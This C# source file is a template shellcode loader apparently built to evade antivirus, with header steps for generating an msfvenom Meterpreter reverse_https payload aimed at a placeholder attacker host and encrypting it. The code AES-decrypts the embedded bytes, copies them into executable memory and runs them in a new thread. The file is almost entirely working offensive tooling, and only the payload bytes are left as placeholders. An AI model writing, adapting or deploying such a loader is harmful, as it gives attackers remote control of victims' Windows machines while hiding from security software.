// =============================================================================
// TEMPLATE - replace buf with your encrypted shellcode before compiling
//
// Generate and encrypt shellcode:
//   1. msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f csharp
//   2. Paste bytes into aes-shellcode-encryption.cs and run it
//   3. Copy the output buf here and update the byte count
// =============================================================================

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.Security.Cryptography;  // Added for AES
using System.IO;  // Added for MemoryStream

namespace AV_Ceasar_Runner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            // Replace this with your actual encrypted shellcode bytes (IV + ciphertext from encryption)
            // Minimum 32 bytes: 16-byte IV + at least 16-byte ciphertext (one AES block)
            // Generate with: aes-shellcode-encryption/aes-shellcode-encryption.cs
            byte[] buf = new byte[] {
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            }; // TODO: paste your full encrypted bytes here (min 32 bytes: 16 IV + 16+ ciphertext)

            // Decrypt using AES (replaces the Caesar loop)
            byte[] decryptedShellcode = Decrypt(buf);

            int size = decryptedShellcode.Length;

            // FIXED: use actual shellcode size, not hardcoded 0x1000
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);

            Marshal.Copy(decryptedShellcode, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        // AES Decryption Method
        static byte[] Decrypt(byte[] encryptedData)
        {
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = Encryption.Key;

                // Extract IV (first 16 bytes) and ciphertext (rest)
                byte[] iv = new byte[16];
                Array.Copy(encryptedData, 0, iv, 0, 16);
                aes.IV = iv;

                byte[] ciphertext = new byte[encryptedData.Length - 16];
                Array.Copy(encryptedData, 16, ciphertext, 0, ciphertext.Length);

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                using (var ms = new MemoryStream(ciphertext))
                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (var resultStream = new MemoryStream())
                {
                    cs.CopyTo(resultStream);
                    return resultStream.ToArray();  // This is your original shellcode
                }
            }
        }

        // Encryption class with the shared key
        static class Encryption
        {
            public static readonly byte[] Key = Encoding.UTF8.GetBytes("t51JpSvoag6052x1go4PvuSiLOwNWifX");
        }
    }
}